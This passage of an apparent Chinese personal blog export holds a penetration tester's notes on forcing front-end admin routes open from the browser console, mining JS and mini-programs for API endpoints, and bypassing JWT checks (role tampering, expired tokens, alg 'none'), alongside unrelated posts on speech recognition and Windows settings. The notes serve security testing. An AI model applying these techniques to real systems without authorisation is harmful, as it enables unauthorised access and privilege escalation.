<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//引号后面加要跳转的目录</span><br><span class="line">window.location.href = &quot;/mch/info_basic/&quot;;</span><br><span class="line"></span><br><span class="line">//不行可以用这个</span><br><span class="line"></span><br><span class="line">location.hash = &#x27;/user/admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果你看到闪现了一下后台的页面就代表他们是把后台页面也放到了前端了的，有两种情况</p>
<p>1&gt;跳转后可能在控制台会报错，点击报错的js位置进行断点，然后再输入一次控制台指令，当然，你直接在url输入也一样，就可以卡到js加载的后端</p>
<p><img src="/../image/web-js-freely/test2.jpg"></p>
<p>2&gt;跳转后无异常，又有两种情况解决</p>
<p>​	—你需要多找几个断点，直到找到控制台输入指令可以调试的那个断点，一直调试下一步，直到有后台页面</p>
<p>​	—控制台输入代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.onbeforeunload = function() &#123;</span><br><span class="line">    return &quot;你确定要离开吗？&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//然后再输入</span><br><span class="line">location.hash = &#x27;/admin/xxxx&#x27;;</span><br></pre></td></tr></table></figure>

<p>​			一般来说，就会跳转到第一种情况，当然，具体情况还得看js咋写的</p>
<p><img src="/../image/web-js-freely/test1.jpg"></p>
<p>跳转到后台页面后一般是不能点击里面的链接的，这个时候要跳到f12的网络功能或者打开burp拦截包，将返回”Unauthorized”或者相关的都禁用或者拦截，禁用完之后，再运行一次控制台指令就不会强制跳转了</p>
<p><img src="/../image/web-js-freely/3.png"></p>
<p>！！！值得注意的是：</p>
<p>1&gt;<strong>记得提前删除网络日历，要不然太多了影响判断</strong></p>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>2&gt;<strong>一般看js文件中用的是什么强制跳转的函数，js用什么你就用什么，例如这个就要用location.hash&#x3D;”(后台目录)”</strong></p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<p><img src="/../image/web-js-freely/2.jpg"></p>
<h1 id="本地更改js文件"><a href="#本地更改js文件" class="headerlink" title="本地更改js文件"></a>本地更改js文件</h1><p>1&gt;无需多言，看得懂，会改，哪基本前端就没有什么秘密了</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web-net</tag>
        <tag>js</tag>
        <tag>key</tag>
      </tags>
  </entry>
  <entry>
    <title>方言识别</title>
    <url>/2025/02/18/%E6%96%B9%E8%A8%80%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<p><strong>前言：</strong></p>
<p>​	为了便宜行事，可以找语音识别的现成项目进行修改，我最多是一个拼接的应用层，技术算法那些就别花费太多时间了，我只要知道是什么，如何用就成，把高端的科技服务我这种普通人</p>
<p>(–训练200轮，1轮3-5小时，跑了3轮暂时搁置–)</p>
<p>参考项目：<a href="https://github.com/yeyupiaoling/PaddlePaddle-DeepSpeech/tree/release/1.0">https://github.com/yeyupiaoling/PaddlePaddle-DeepSpeech/tree/release/1.0</a></p>
<p>参考视频：<a href="https://www.bilibili.com/video/BV1Ng411j7xB/?spm_id_from=333.788.videopod.sections&vd_source=62ec56a0e96ac07702343ec20500f1cc">DeepSpeech2实现的中文语音识别_哔哩哔哩_bilibili</a></p>
<hr>
<p>可参考项目:<a href="https://blog.csdn.net/gitblog_00059/article/details/136961410">https://blog.csdn.net/gitblog_00059/article/details/136961410</a></p>
<hr>
<h4 id="以参考项目为例："><a href="#以参考项目为例：" class="headerlink" title="以参考项目为例："></a>以参考项目为例：</h4><h5 id="1-流程"><a href="#1-流程" class="headerlink" title="1&gt;流程"></a>1&gt;流程</h5><p>下载数据集—&gt;数据预处理—&gt;训练模型—&gt;预测模型—&gt;预测方言成文字—&gt;结果</p>
<h6 id="·出现的问题"><a href="#·出现的问题" class="headerlink" title="·出现的问题"></a>·出现的问题</h6><span id="more"></span>

<p>[1]–下载GUDAA以及啥来着忘了，一个拖动的</p>
<p>[2]–下载C++工具</p>
<h1 id="方言识别模型训练思路框架"><a href="#方言识别模型训练思路框架" class="headerlink" title="方言识别模型训练思路框架"></a>方言识别模型训练思路框架</h1><h2 id="1-数据准备"><a href="#1-数据准备" class="headerlink" title="1. 数据准备"></a>1. 数据准备</h2><h3 id="1-1-收集方言语音数据"><a href="#1-1-收集方言语音数据" class="headerlink" title="1.1 收集方言语音数据"></a>1.1 收集方言语音数据</h3><ul>
<li>收集多种方言的语音数据，如粤语、吴语、闽南语等。</li>
<li>数据应该包括：<ul>
<li><strong>音频文件</strong>：采用 WAV 格式的语音文件。</li>
<li><strong>转录文件</strong>：每个音频文件对应的文字转录（普通话或方言的标注文本）。</li>
</ul>
</li>
<li>数据量要足够多，保证训练的多样性。</li>
</ul>
<h3 id="1-2-数据标注"><a href="#1-2-数据标注" class="headerlink" title="1.2 数据标注"></a>1.2 数据标注</h3><ul>
<li>对方言语音进行准确的标注，确保转录文件和音频文件一一对应。</li>
<li>可以使用拼音、普通话字符集进行标注。</li>
<li>对不同方言的转录进行统一标准化处理。</li>
</ul>
<h2 id="2-数据预处理"><a href="#2-数据预处理" class="headerlink" title="2. 数据预处理"></a>2. 数据预处理</h2><h3 id="2-1-特征提取"><a href="#2-1-特征提取" class="headerlink" title="2.1 特征提取"></a>2.1 特征提取</h3><ul>
<li>将音频文件转换为 <strong>梅尔频率倒谱系数（MFCC）</strong> 特征。<ul>
<li>通过音频处理工具（如 <code>librosa</code>）提取 MFCC 特征。</li>
</ul>
</li>
<li>可选：使用数据增强技术，如添加背景噪声，进行时间偏移等。</li>
</ul>
<h3 id="2-2-文本规范化"><a href="#2-2-文本规范化" class="headerlink" title="2.2 文本规范化"></a>2.2 文本规范化</h3><ul>
<li>规范化文本数据，确保文本格式统一。<ul>
<li>可以进行拼音转换，或者采用标准的普通话字符集。</li>
</ul>
</li>
</ul>
<h3 id="2-3-数据集划分"><a href="#2-3-数据集划分" class="headerlink" title="2.3 数据集划分"></a>2.3 数据集划分</h3><ul>
<li>划分训练集、验证集和测试集（常见的比例是 80% 训练集，10% 验证集，10% 测试集）。</li>
</ul>
<h2 id="3-安装-DeepSpeech"><a href="#3-安装-DeepSpeech" class="headerlink" title="3. 安装 DeepSpeech"></a>3. 安装 DeepSpeech</h2><h3 id="3-1-安装依赖"><a href="#3-1-安装依赖" class="headerlink" title="3.1 安装依赖"></a>3.1 安装依赖</h3><ul>
<li><p>安装 DeepSpeech：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install deepspeech</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装训练时的依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">pip install deepspeech-gpu</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-2-环境配置"><a href="#3-2-环境配置" class="headerlink" title="3.2 环境配置"></a>3.2 环境配置</h3><ul>
<li>配置 Python 环境，安装所需的库（如 <code>tensorflow</code>, <code>numpy</code> 等）。</li>
</ul>
<h2 id="4-模型训练"><a href="#4-模型训练" class="headerlink" title="4. 模型训练"></a>4. 模型训练</h2><h3 id="4-1-准备数据文件"><a href="#4-1-准备数据文件" class="headerlink" title="4.1 准备数据文件"></a>4.1 准备数据文件</h3><ul>
<li><p>将数据集转化为 DeepSpeech 支持的格式（CSV 文件），包含音频路径和对应文本。</p>
</li>
<li><p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">path/to/audio1.wav,你好</span><br><span class="line">path/to/audio2.wav,早安</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-2-配置训练参数"><a href="#4-2-配置训练参数" class="headerlink" title="4.2 配置训练参数"></a>4.2 配置训练参数</h3><ul>
<li><p>设置训练参数：</p>
<ul>
<li><p>学习率、批量大小、训练步数等。</p>
</li>
<li><p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">--train_batch_size 32</span><br><span class="line">--dev_batch_size 16</span><br><span class="line">--epochs 30</span><br><span class="line">--checkpoint_dir checkpoints</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="4-3-启动训练"><a href="#4-3-启动训练" class="headerlink" title="4.3 启动训练"></a>4.3 启动训练</h3><ul>
<li><p>使用 DeepSpeech 的命令行工具启动训练：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">deepspeech --train_files data/train.csv --dev_files data/dev.csv --test_files data/test.csv --train_batch_size 32 --dev_batch_size 16 --epochs 30 --checkpoint_dir checkpoints</span><br></pre></td></tr></table></figure>
</li>
<li><p>训练过程中 DeepSpeech 会自动进行特征提取和模型训练。</p>
</li>
</ul>
<h2 id="5-模型评估与优化"><a href="#5-模型评估与优化" class="headerlink" title="5. 模型评估与优化"></a>5. 模型评估与优化</h2><h3 id="5-1-评估模型性能"><a href="#5-1-评估模型性能" class="headerlink" title="5.1 评估模型性能"></a>5.1 评估模型性能</h3><ul>
<li>在每个训练周期后评估模型在验证集和测试集上的表现。</li>
<li>使用 <strong>字符错误率（CER）</strong> 或 <strong>词错误率（WER）</strong> 来衡量模型性能。</li>
</ul>
<h3 id="5-2-优化策略"><a href="#5-2-优化策略" class="headerlink" title="5.2 优化策略"></a>5.2 优化策略</h3><ul>
<li>调整超参数（如学习率、批量大小等）来优化模型训练。</li>
<li>增加训练数据量，特别是方言区域的多样性。</li>
<li>使用噪声抑制和数据增强来提高鲁棒性。</li>
</ul>
<h2 id="6-方言识别应用"><a href="#6-方言识别应用" class="headerlink" title="6. 方言识别应用"></a>6. 方言识别应用</h2><h3 id="6-1-使用训练好的模型进行推理"><a href="#6-1-使用训练好的模型进行推理" class="headerlink" title="6.1 使用训练好的模型进行推理"></a>6.1 使用训练好的模型进行推理</h3><ul>
<li><p>使用训练好的模型进行语音识别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">deepspeech --model checkpoints/model.pbmm --scorer checkpoints/model.scorer --audio your_audio.wav</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6-2-应用部署"><a href="#6-2-应用部署" class="headerlink" title="6.2 应用部署"></a>6.2 应用部署</h3><ul>
<li>将模型部署到实际的应用中，如语音助手、自动字幕生成、方言识别等。</li>
</ul>
<h2 id="7-持续优化"><a href="#7-持续优化" class="headerlink" title="7. 持续优化"></a>7. 持续优化</h2><ul>
<li>根据用户反馈不断更新和优化模型，增加方言样本，优化模型结构。</li>
<li>定期更新训练数据，确保模型的准确性和鲁棒性。</li>
</ul>
<hr>
<p><strong>注意事项：</strong></p>
<ul>
<li>方言识别的难点之一是口音和发音差异，因此训练数据必须具备多样性。</li>
<li>端到端训练是一个计算密集型过程，训练时需要高效的硬件支持（如 GPU）。</li>
<li>可以考虑使用 <strong>迁移学习</strong>，利用已有的大规模语音识别模型进行微调，以加速训练过程。</li>
</ul>
]]></content>
      <categories>
        <category>machine-learning</category>
      </categories>
      <tags>
        <tag>数据集</tag>
        <tag>语言模型</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows注册表防更新</title>
    <url>/2024/12/30/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%98%B2%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:0000F423F</span><br><span class="line">&quot;PauseFeatureUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseFeatureUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseUpdatesExpiryTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>直接去注册表如下位置添加DWORD(32位)值(D)，值自己设，进制改为10按道理也行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:00002710</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows update</tag>
      </tags>
  </entry>
  <entry>
    <title>主页和api</title>
    <url>/2024/12/26/%E4%B8%BB%E9%A1%B5%E5%92%8Capi/</url>
    <content><![CDATA[<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>在工作期间所遇到的小程序和web端所用的方式如下：</p>
<p>1、主页由其子域名显示，其他功能显示皆由该子域名指向，xxx#&#x2F;page&#x2F;xxx</p>
<p>2、其信息由专门的api子域名来传回，有时会有sms子域名用作短信的发送</p>
<p>3、若没有登录，部分功能的显示可以显示，但无实际信息，即，空白，json为{}</p>
<span id="more"></span>

<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>1.页面和小程序反编译爬取出的js文件或者json文件通常会有上述两个子域名的指向&#x2F;接口</p>
<p>2.找到指向&#x2F;接口，能够查看页面的功能以及接口的作用，用作于测试接口</p>
<p>3.通常会有登录接口用作返回token，大概率为jwt</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>1.有些网址不登录，后台的接口，以及其他的接口无法查看，只能看到个登录接口，即后续网址接口信息需要后台返回，但不代表不存在，通常即使是一个服务器其功能和作用都会十分广泛，毕竟好的服务器很贵的。</p>
<p>—&gt;所以可以从多方入手，例如：该子域名的其他小程序，该接口子域名是否存在被其他网址或小程序被调用的可能</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1.web需要登录就找它对应的小程序，一般来说小程序一旦授权就会给合法jwt</p>
<p>2.用jwt深度爬取js，就是哪里能点点哪里，都点一遍，然后把js脚本下下来，分析指向#&#x2F;xxx&#x2F;和api</p>
<p>3.看有无越权，逻辑漏洞，版本泄露，路径泄露和框架泄露等等</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>认真分析一个事物就会形成一条思路明显的线路，整体的框架和内容就会完整，认真很久了还没思路那就去睡觉</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>api</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞库</title>
    <url>/2024/12/26/%E6%BC%8F%E6%B4%9E%E5%BA%93/</url>
    <content><![CDATA[<p><a href="https://wiki.wy876.cn/#/">漏洞文库</a></p>
<p><a href="https://github.com/wy876/POC">github漏洞库</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>自动追番网址</title>
    <url>/2024/12/25/%E8%87%AA%E5%8A%A8%E8%BF%BD%E7%95%AA%E7%BD%91%E5%9D%80/</url>
    <content><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><p><a href="https://www.autobangumi.org/">AutoBangumi官网</a> —利用rss订阅字幕组，实现自动追番，部署比较轻松，docker部署</p>
<p><a href="https://www.qbittorrent.org/download">qbittorrent下载地址</a> —下载器，订阅后这玩意负责自动下载，我1kG的流量就这么没的</p>
<p><a href="https://emby.media/download.html">Emby下载地址</a> —播放器，其他的也可以，具体看bangumi和服务器支不支持</p>
<span id="more"></span>

<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="/../image/auto_anime/1.png"></p>
<hr>
<p><a href="https://github.com/wushuo894/ani-rss?tab=readme-ov-file">ani-rss项目地址-GitHub</a> —支持 <strong>Transmission</strong> <strong>qBittorrent</strong> <strong>Aria2</strong> 下载器</p>
<p>ani-rss部署参考别个博客<a href="https://www.himiku.com/archives/ani-rss.html">初之音博客</a></p>
]]></content>
      <categories>
        <category>anime</category>
      </categories>
      <tags>
        <tag>rss</tag>
        <tag>qBitTorrent</tag>
        <tag>Two-dimensional</tag>
      </tags>
  </entry>
  <entry>
    <title>正则匹配脚本</title>
    <url>/2024/12/23/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>今天上班的时候，老是发现uuid这些长id，我要想利用又懒得一个个复制，所以搞了一个脚本扩展，因为我是新手嘛，所以这个脚本有蛮多毛病，这章专门用来介绍哪些毛病，方便以后想改了，拿出来看看好找到要改的地方，我脚本放到github了，以防自己改炸了还有备份</p>
<p>顺便记录一下排查api的正则</p>
<span id="more"></span>

<h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><p>1、python代码里只匹配了双引号和单引号</p>
<p>2、直接将匹配到的内容写入文件—空格字符和回车字符</p>
<p>3、没有检查匹配字符的过程—不能实时的查看自己的匹配过程	&#x2F;&#x2F;主要</p>
<h1 id="正则记录"><a href="#正则记录" class="headerlink" title="正则记录"></a>正则记录</h1><h3 id="以method为特征值"><a href="#以method为特征值" class="headerlink" title="以method为特征值"></a>以method为特征值</h3><p>&#x3D;&#x3D;&gt;遍历 js 跑出 api 的个数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method\s*:\s*&quot;(post|get)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="以path为特征值"><a href="#以path为特征值" class="headerlink" title="以path为特征值"></a>以path为特征值</h3><p>&#x3D;&#x3D;&gt;遍历 js 尽可能跑出 api 以及虚拟页面的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义匹配的正则表达式和分类标签</span><br><span class="line">	含重复的正则</span><br><span class="line">pattern_groups = &#123;</span><br><span class="line">    &quot;PagePath Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Aa][Gg][Ee][Pp][Aa][Tt][Hh]:\s*&quot;(.*?)&quot;&#x27;), &quot;pagePath_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Aa][Gg][Ee][Pp][Aa][Tt][Hh]:\s*&#x27;(.*?)&#x27;&quot;), &quot;pagePath_double_quotes&quot;),</span><br><span class="line">    ],</span><br><span class="line">    &quot;Path Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Aa][Tt][Hh]:\s*&quot;(.*?)&quot;&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Aa][Tt][Hh]:\s*&#x27;(.*?)&#x27;&quot;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Uu][Rr][Ll]:\s*&quot;([^&quot;]+)&quot;&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Uu][Rr][Ll]: &quot;([^&quot;]+)&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">    ],</span><br><span class="line">    &quot;GET Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Gg][Ee][Tt]\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&quot;[Gg][Ee][Tt]\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Gg][Ee][Tt]\(\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*,&#x27;), &quot;&quot;)，</span><br><span class="line">    ],</span><br><span class="line">    &quot;POST Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Oo][Ss][Tt]\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Oo][Ss][Tt]\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Pp][Oo][Ss][Tt]\(\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*,&#x27;), &quot;&quot;)，</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="以特殊符号为特征值"><a href="#以特殊符号为特征值" class="headerlink" title="以特殊符号为特征值"></a>以特殊符号为特征值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 匹配完整 URL（含协议或协议相对）</span><br><span class="line">(?:&quot;|&#x27;)                              # 起始引号（单引号或双引号）</span><br><span class="line">((?:[a-zA-Z]&#123;1,10&#125;://|//)            # 协议：例如 http://、https://、ftp:// 或协议相对 //</span><br><span class="line">[^&quot;&#x27;/]&#123;1,&#125;\.                         # 主域名（不含引号或斜线）+ 点</span><br><span class="line">[a-zA-Z]&#123;2,&#125;[^&quot;&#x27;]&#123;0,&#125;)               # 顶级域名后缀（如 com/net）+ 可选路径</span><br><span class="line">(?:&quot;|&#x27;)                              # 结束引号</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;https://example.com/path&quot; 或 &#x27;//cdn.xxx.com&#x27; 的完整 URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2. 匹配相对路径（以 /、../ 或 ./ 开头）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">((?:/|\.\./|\./)                     # 以 /、../ 或 ./ 开头</span><br><span class="line">[^&quot;&#x27;&gt;&lt;,;| *()(%%$^/\\\[\]]           # 第一个字符不能为特殊符号</span><br><span class="line">[^&quot;&#x27;&gt;&lt;,;|()]&#123;1,&#125;)                    # 后续字符为路径</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;/api/user&quot;、&quot;../img/pic.png&quot; 的相对路径链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3. 匹配目录+资源文件（如 action、js、png）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-/]&#123;1,&#125;/                # 至少一个目录名 + 斜杠</span><br><span class="line">[a-zA-Z0-9_\-/]&#123;1,&#125;                  # 文件名</span><br><span class="line">\.(?:[a-zA-Z]&#123;1,4&#125;|action)           # 文件后缀（如 .js/.css/.action）</span><br><span class="line">(?:[\?|/][^&quot;&#x27; ]&#123;0,&#125;|))               # 可选参数或路径，如 ?id=1</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;admin/login.action&quot;、&quot;static/app.js?v=1&quot; 的接口或资源路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 4. 匹配单文件名 + 参数（如 login.php?id=1）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-]&#123;1,&#125;                  # 文件名</span><br><span class="line">\.(?:php|asp|aspx|jsp|json|          # 特定后缀（可扩展）</span><br><span class="line">action|html|js|txt|xml)</span><br><span class="line">(?:\?[^&quot;&#x27;]&#123;0,&#125;|))                    # 可选参数</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;index.php?id=1&quot;、&quot;test.jsp&quot; 的单独接口文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 5. 匹配 .do/.cgi/.py 等其他接口风格</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-/.]&#123;1,&#125;</span><br><span class="line">\.(?:do|cgi|py|rb|go)</span><br><span class="line">(?:\?[^&quot;&#x27;]&#123;0,&#125;|))</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取 &quot;.do&quot;、&quot;.cgi&quot;、&quot;.py&quot; 等扩展名接口（例如 WebLogic、老系统常见）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h1><p><a href="https://github.com/cliayn/bp_py_regular-expressions">bp插件</a></p>
<p><a href="https://github.com/cliayn/re_js_api-dir">api脚本</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>jython</tag>
        <tag>Burp Suite</tag>
      </tags>
  </entry>
  <entry>
    <title>web和小程序的漏洞排查</title>
    <url>/2024/12/20/%E7%AC%94%E8%AE%B0_js-request/</url>
    <content><![CDATA[<p>该篇文章为记录在工作时遇到的基本问题以及对应的解决方式，以免自己把一些方法用完就忘，下次遇到又得🐔🐔</p>
<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><h3 id="过前端加密"><a href="#过前端加密" class="headerlink" title="过前端加密"></a>过前端加密</h3><p>​	在web端或者小程序中可能遇到请求包中的参数加密的情况，这种加密我一般用下面的两种处理方式。</p>
<span id="more"></span>

<h6 id="1、在js中找加密和解密算法"><a href="#1、在js中找加密和解密算法" class="headerlink" title="1、在js中找加密和解密算法"></a>1、在js中找加密和解密算法</h6><p>​		—如果是自定义算法你可中大奖了，你得解算法</p>
<p>​		—&gt;适用于简单的、有框架可套的算法，例如：AES、DES、RSA-酌情考虑</p>
<p>​		1&gt;主要是排查js代码中的加密函数和解密函数，小程序的话需要用工具调出控制台进行调试</p>
<p>​		2&gt;排查的函数通常为encrypt、decrypt函数，简单的直接在源代码处ctrl+f找这两单词就行，复杂的需要交数据前暂停执行进行调试，可能有点抽象，给个图就好了</p>
<p><img src="/../image/note_24_12/1_1-2.jpg" alt="1_1-2"></p>
<p>​		3&gt;复杂的需要一步步找，一般是小程序需要调试，步骤如下：</p>
<p>​			（1）、暂停执行</p>
<p>​			（2）、输入框中输入数据</p>
<p>​			（3）、点下一步，或者下一个函数</p>
<p>​			（4）、等监视的数据突然加密了，就记下那个函数分析</p>
<p>​			（5）、主要找加密算法是什么、iv和key，自定义算法和国密那些就用第二个方法吧</p>
<p>​	小程序需要用工具调出，工具推荐如下：</p>
<p>​			①、<a href="https://github.com/eeeeeeeeee-code/e0e1-wx">windows_自动化反编译</a> </p>
<p>​			②、<a href="https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python/releases/">WeChatOpenDevTools-Python</a> </p>
<h6 id="2、在控制台中定义函数直接输入数据"><a href="#2、在控制台中定义函数直接输入数据" class="headerlink" title="2、在控制台中定义函数直接输入数据"></a>2、在控制台中定义函数直接输入数据</h6><p>​		1&gt;这个如果处理的好，在web端基本可以直接无需理会加密</p>
<p>​			—&gt;需要比较熟练的使用python或者其他的代码，但是，熟练使用ai也行</p>
<p>​		2&gt;有篇文章讲的很细，如下：</p>
<p>​			—&gt;<a href="https://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmEr8RpQcC1aoD">保姆级教程—前端加密的对抗（附带靶场） - 先知社区</a> </p>
<h6 id="3、other"><a href="#3、other" class="headerlink" title="3、other"></a>3、other</h6><p>​	—&gt;在应用软件中去壳逆向分析伪代码</p>
<h3 id="jwt-api问题"><a href="#jwt-api问题" class="headerlink" title="jwt_api问题"></a>jwt_api问题</h3><p>​	我见识现在不多，有错误的地方，想起来了就回来改一下，没有想起来就错下去喽。</p>
<p>​	jwt身份验证，一般情况不会给人伪造为空或者爆破出来密钥的机会，对我们有利的地方是通过正规途径获得一个合法的jwt后他们的接口通常不会有过多的权限管理，人话就是越权，逻辑洞可能比较多</p>
<h6 id="1、尝试jwt绕过"><a href="#1、尝试jwt绕过" class="headerlink" title="1、尝试jwt绕过"></a>1、尝试jwt绕过</h6><h6 id="—-生产环境没成功过"><a href="#—-生产环境没成功过" class="headerlink" title="—&gt;生产环境没成功过"></a>—&gt;生产环境没成功过</h6><p>在渗透测试中，可以尝试以下几种JWT绕过方法—没有也要试试，成功就爽了</p>
<p>​	1&gt;<strong>修改JWT令牌</strong>：通过修改JWT的Payload部分，可以尝试提升权限。例如，将用户角色从普通用户修改为管理员<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
<p>​	2&gt;<strong>利用过期令牌</strong>：有时即使JWT令牌已过期，服务器端可能仍然接受该令牌。通过修改令牌中的<em>exp</em>（过期时间）字段，可以尝试让过期令牌重新生效<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<p>​	3&gt;<strong>历史令牌伪造</strong>：如果能够获取到历史JWT令牌，可以尝试修改其中的<em>iat</em>（签发时间）和<em>exp</em>字段，使其看起来像是新签发的令牌<a href="https://blog.csdn.net/weixin_51559599/article/details/134860478">3</a>。</p>
<p>​	4&gt;<strong>算法混淆</strong>：JWT头部中的<em>alg</em>字段指定了签名算法。如果服务器端没有正确验证该字段，可以尝试将其修改为<em>none</em>，绕过签名验证<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
